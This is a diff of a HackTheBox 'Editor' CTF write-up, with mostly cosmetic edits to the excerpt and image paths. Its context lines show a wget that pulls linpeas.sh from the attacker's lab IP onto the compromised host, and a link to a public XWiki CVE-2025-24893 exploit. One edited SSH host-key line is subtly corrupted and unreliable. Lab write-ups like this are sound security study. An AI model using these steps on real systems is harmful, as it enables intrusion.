@@ -3,7 +3,7 @@ layout: article
 title: "Editor"
 date: 2026-05-17
 platform: "HackTheBox"
-excerpt: "Editor is an Easy-rated Linux machine on Hack The Box that combines unauthenticated web application exploitation, credential reuse, and a local privilege escalation via a misconfigured SUID binary"
+excerpt: "Editor is an Easy-rated Linux machine on Hack The Box that combines unauthenticated web application exploitation, credential reuse, and a local privilege escalation via a misconfigured SUID binary."
 ---
 
 # HTB Editor Machine
@@ -16,7 +16,7 @@ excerpt: "Editor is an Easy-rated Linux machine on Hack The Box that combines un
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
-`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-'
 The Modern Day Port Scanner.
 ________________________________________
 : http://discord.skerritt.blog         :
@@ -39,7 +39,7 @@ PORT     STATE SERVICE     REASON  VERSION
 22/tcp   open  ssh         syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
-| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNlYy1uaXN0cDI1NgAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
 |   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
 80/tcp   open  http        syn-ack nginx 1.18.0 (Ubuntu)
@@ -99,7 +99,7 @@ Nmap done: 1 IP address (1 host up) scanned in 20.77 seconds
 
 Robots.txt on the wiki subdomain revealed that the application was running XWiki using Jetty on port 8080.
 
-![Xwiki web app](assets/images/editorhtb/image.png)
+![Xwiki web app]({{ '/assets/images/editorhtb/image.png' | relative_url }})
 
 ```jsx
 User-agent: *
@@ -163,9 +163,9 @@ Disallow: /xwiki/bin/webjars/
 
 ```
 
-![image.png](image%201.png)
+![image.png]({{ '/assets/images/editorhtb/image%201.png' | relative_url }})
 
-![image.png](image%202.png)
+![image.png]({{ '/assets/images/editorhtb/image%202.png' | relative_url }})
 
 ```jsx
 xwiki@editor:/var/tmp$ wget http://10.10.14.92:8000/linpeas.sh
@@ -186,7 +186,7 @@ linpeas.sh  xwiki-8080.lck
 
 ```
 
-![image.png](image%203.png)
+![image.png]({{ '/assets/images/editorhtb/image%203.png' | relative_url }})
 
 ### Creds:
 
@@ -217,15 +217,15 @@ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)
 
 ### User’s Flag:
 
-![image.png](image%204.png)
+![image.png]({{ '/assets/images/editorhtb/image%204.png' | relative_url }})
 
 ### Root Flag:
 
-![image.png](image%205.png)
+![image.png]({{ '/assets/images/editorhtb/image%205.png' | relative_url }})
 
-![image.png](image%206.png)
+![image.png]({{ '/assets/images/editorhtb/image%206.png' | relative_url }})
 
-![image.png](image%207.png)
+![image.png]({{ '/assets/images/editorhtb/image%207.png' | relative_url }})
 
 [https://github.com/gunzf0x/CVE-2025-24893](https://github.com/gunzf0x/CVE-2025-24893)
 
